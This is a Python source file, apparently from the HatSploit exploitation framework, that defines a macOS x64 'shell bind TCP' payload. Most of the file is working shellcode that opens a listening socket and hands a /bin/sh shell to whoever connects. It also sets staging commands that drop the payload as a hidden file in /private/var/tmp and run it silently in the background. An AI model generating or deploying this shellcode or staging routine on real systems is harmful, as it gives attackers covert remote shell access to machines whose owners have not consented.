#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import HatSploitPayload

from utils.payload.payload_generator import payload_generator

class HatSploitPayload(HatSploitPayload):
    payload_generator = payload_generator()

    details = {
        'Category': "macos/shell",
        'Name': "macOS x64 Shell Bind TCP",
        'Payload': "macos/x64/shell_bind_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Shell Bind TCP Payload for macOS x64."
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FORMAT': {
            'Description': "Executable format.",
            'Value': "macho",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        bind_port, executable_format = self.parser.parse_options(self.options)
        bind_port = self.payload_generator.port_to_bytes(bind_port)

        if not executable_format in self.payload_generator.formats.keys():
            self.badges.output_error("Invalid executable format!")
            return None

        self.badges.output_process("Generating shellcode...")
        shellcode = (
            b"\x48\x31\xff" +                              # xorq  %rdi, %rdi
            b"\x40\xb7\x02" +                              # movb  $2, %dil
            b"\x48\x31\xf6" +                              # xorq  %rsi, %rsi
            b"\x40\xb6\x01" +                              # movb  $1, %sil
            b"\x48\x31\xd2" +                              # xorq  %rdx, %rdx
            b"\x48\x31\xc0" +                              # xorq  %rax, %rax
            b"\xb0\x02" +                                  # movb  $2, %al
            b"\x48\xc1\xc8\x28" +                          # rorq  $40, %rax
            b"\xb0\x61" +                                  # movb  $97, %al
            b"\x49\x89\xc4" +                              # movq  %rax, %r12
            b"\x0f\x05" +                                  # syscall
            b"\x49\x89\xc1" +                              # movq  %rax, %r9
            b"\x48\x89\xc7" +                              # movq  %rax, %rdi
            b"\x48\x31\xf6" +                              # xorq  %rsi, %rsi
            b"\x56" +                                      # pushq  %rsi
            b"\xbe\x01\x02" +                              # movl  port, %esi
            bind_port +                                    # port
            b"\x83\xee\x01" +                              # subl  $1, %esi
            b"\x56" +                                      # pushq  %rsi
            b"\x48\x89\xe6" +                              # movq  %rsp, %rsi
            b"\xb2\x10" +                                  # movb  $16, %dl
            b"\x41\x80\xc4\x07" +                          # addb  $7, %r12b
            b"\x4c\x89\xe0" +                              # movq  %r12, %rax
            b"\x0f\x05" +                                  # syscall
            b"\x48\x31\xf6" +                              # xorq  %rsi, %rsi
            b"\x48\xff\xc6" +                              # incq  %rsi
            b"\x41\x80\xc4\x02" +                          # addb  $2, %r12b
            b"\x4c\x89\xe0" +                              # movq  %r12, %rax
            b"\x0f\x05" +                                  # syscall
            b"\x48\x31\xf6" +                              # xorq  %rsi, %rsi
            b"\x41\x80\xec\x4c" +                          # subb  $76, %r12b
            b"\x4c\x89\xe0" +                              # movq  %r12, %rax
            b"\x0f\x05" +                                  # syscall
            b"\x48\x89\xc7" +                              # movq  %rax, %rdi
            b"\x48\x31\xf6" +                              # xorq  %rsi, %rsi
            b"\x41\x80\xc4\x3c" +                          # addb  $60, %r12b
            b"\x4c\x89\xe0" +                              # movq  %r12, %rax
            b"\x0f\x05" +                                  # syscall
            b"\x48\xff\xc6" +                              # incq  %rsi
            b"\x4c\x89\xe0" +                              # movq  %r12, %rax
            b"\x0f\x05" +                                  # syscall
            b"\x48\x31\xf6" +                              # xorq  %rsi, %rsi
            b"\x56" +                                      # pushq  %rsi
            b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68" +  # movabsq  $7526411553527181103, %rdi
            b"\x57" +                                      # pushq  %rdi
            b"\x48\x89\xe7" +                              # movq  %rsp, %rdi
            b"\x48\x31\xd2" +                              # xorq  %rdx, %rdx
            b"\x41\x80\xec\x1f" +                          # subb  $31, %r12b
            b"\x4c\x89\xe0" +                              # movq  %r12, %rax
            b"\x0f\x05"                                    # syscall
        )

        self.badges.output_process("Generating payload...")
        payload = self.payload_generator.generate(executable_format, 'x64', shellcode)

        instructions = ""
        instructions += "cat >/private/var/tmp/.payload;"
        instructions += "chmod +x 777 /private/var/tmp/.payload;"
        instructions += "sh -c '/private/var/tmp/.payload' 2>/dev/null &"
        instructions += "\n"

        self.payload = payload
        self.instructions = instructions
        self.action = 'bind_tcp'
